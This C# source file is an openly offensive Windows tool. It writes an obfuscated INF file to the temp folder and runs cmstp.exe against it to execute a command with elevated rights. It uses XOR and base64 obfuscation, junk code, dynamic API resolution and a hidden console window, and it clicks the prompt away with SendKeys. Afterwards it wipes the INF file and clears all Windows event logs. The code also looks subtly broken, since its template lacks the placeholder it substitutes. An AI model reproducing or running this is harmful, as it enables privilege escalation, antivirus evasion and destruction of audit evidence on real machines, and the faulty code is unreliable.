using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Threading;

public class Program
{
    // Dynamic API Resolution
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // Delegate types for dynamically loaded functions
    private delegate bool ShowWindowDelegate(IntPtr hWnd, int nCmdShow);
    private delegate bool SetForegroundWindowDelegate(IntPtr hWnd);
    private delegate IntPtr GetConsoleWindowDelegate();

    // Generate a random hash identifier
    private static string GetRandomHashIdentifier()
    {
        byte[] buffer = new byte[16];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(buffer);
        }
        return BitConverter.ToString(buffer).Replace("-", "").ToLower();
    }

    // Obfuscate strings using XOR encryption
    private static string Obfuscate(string input)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] ^= 0x55; // XOR with a key
        }
        return Convert.ToBase64String(bytes);
    }

    // Deobfuscate using XOR
    private static string Deobfuscate(string input)
    {
        byte[] bytes = Convert.FromBase64String(input);
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] ^= 0x55;
        }
        return Encoding.UTF8.GetString(bytes);
    }

    // Stack-based string construction (obfuscation)
    private static string BuildString(char[] chars)
    {
        StringBuilder sb = new StringBuilder();
        foreach (char c in chars)
        {
            sb.Append(c);
        }
        return sb.ToString();
    }

    public const string CmstpPath = @"C:\windows\system32\cmstp.exe";

    public static void Main(string[] args)
    {
        // Control flow obfuscation
        if (DateTime.Now.Year == 2026)
        {
            // Junk code
            int[] junk = new int[100];
            for (int i = 0; i < junk.Length; i++)
            {
                junk[i] = i * 2;
            }

            // Random delay
            Random random = new Random();
            Thread.Sleep(random.Next(1000, 5000));

            // Stack-based string
            char[] payloadChars = { 'r', 'u', 'n', 'l', 'e', 'g', 'a', 'c', 'y', 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e' };
            string payloadCommand = BuildString(payloadChars);

            // Obfuscated INF template (split for obfuscation)
            string infPart1 = Obfuscate(@"
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
taskkill /F /IM cmstp.exe

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
");
            string infPart2 = Obfuscate(@"""
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""
");

            string obfuscatedInf = infPart1 + infPart2;
            ExecutePayload(payloadCommand, obfuscatedInf);
        }
    }

    public static void ExecutePayload(string command, string obfuscatedInf)
    {
        // Dynamic API resolution
        IntPtr user32 = LoadLibrary("user32.dll");
        IntPtr kernel32 = LoadLibrary("kernel32.dll");

        var showWindow = Marshal.GetDelegateForFunctionPointer<ShowWindowDelegate>(GetProcAddress(user32, "ShowWindow"));
        var setForegroundWindow = Marshal.GetDelegateForFunctionPointer<SetForegroundWindowDelegate>(GetProcAddress(user32, "SetForegroundWindow"));
        var getConsoleWindow = Marshal.GetDelegateForFunctionPointer<GetConsoleWindowDelegate>(GetProcAddress(kernel32, "GetConsoleWindow"));

        if (!File.Exists(CmstpPath)) return;

        IntPtr consoleWindow = getConsoleWindow();
        showWindow(consoleWindow, 0); // Hide console window

        // Ensure cmstp.exe is not running
        ProcessStartInfo taskkillInfo = new ProcessStartInfo("taskkill")
        {
            Arguments = "/F /IM cmstp.exe",
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process.Start(taskkillInfo);

        string infFilePath = CreateInfFile(command, obfuscatedInf);
        Console.WriteLine("Obfuscated payload file written to " + infFilePath);

        // Execute cmstp with the obfuscated INF file
        ProcessStartInfo cmstpInfo = new ProcessStartInfo(CmstpPath)
        {
            Arguments = "/au \"" + infFilePath + "\"",
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process.Start(cmstpInfo);

        IntPtr cmstpHandle = IntPtr.Zero;
        int attempts = 0;
        while (cmstpHandle == IntPtr.Zero && attempts < 10)
        {
            cmstpHandle = GetProcessHandle("cmstp", user32, setForegroundWindow, showWindow);
            attempts++;
            Thread.Sleep(500); // Delay to avoid CPU spike
        }

        SendKeys.SendWait("{ENTER}");

        CleanUp(infFilePath);
    }

    public static IntPtr GetProcessHandle(string processName, IntPtr user32, SetForegroundWindowDelegate setForegroundWindow, ShowWindowDelegate showWindow)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0) return IntPtr.Zero;

        IntPtr handle = processes[0].MainWindowHandle;
        if (handle == IntPtr.Zero) return IntPtr.Zero;

        setForegroundWindow(handle);
        showWindow(handle, 5); // SW_SHOW
        return handle;
    }

    public static string CreateInfFile(string command, string obfuscatedInf)
    {
        // Control flow obfuscation
        string randomIdentifier;
        if (Environment.OSVersion.Platform == PlatformID.Win32NT)
        {
            randomIdentifier = GetRandomHashIdentifier();
        }
        else
        {
            randomIdentifier = Guid.NewGuid().ToString("N");
        }

        string tempPath = Path.Combine(Path.GetTempPath(), $"{randomIdentifier}.inf");
        File.WriteAllText(tempPath, Deobfuscate(obfuscatedInf).Replace("REPLACE_COMMAND_LINE", command));

        return tempPath;
    }

    public static void CleanUp(string filePath)
    {
        try
        {
            // Overwrite file with random data
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] randomData = new byte[1024];
                rng.GetBytes(randomData);
                File.WriteAllBytes(filePath, randomData);
            }
            File.Delete(filePath);

            // Clear event logs (obfuscated call)
            if (DateTime.Now.DayOfWeek == DayOfWeek.Monday) // Obfuscated condition
            {
                EventLog[] eventLogs = EventLog.GetEventLogs();
                foreach (EventLog eventLog in eventLogs)
                {
                    try { eventLog.Clear(); } catch { }
                }
            }
        }
        catch { }
    }
}
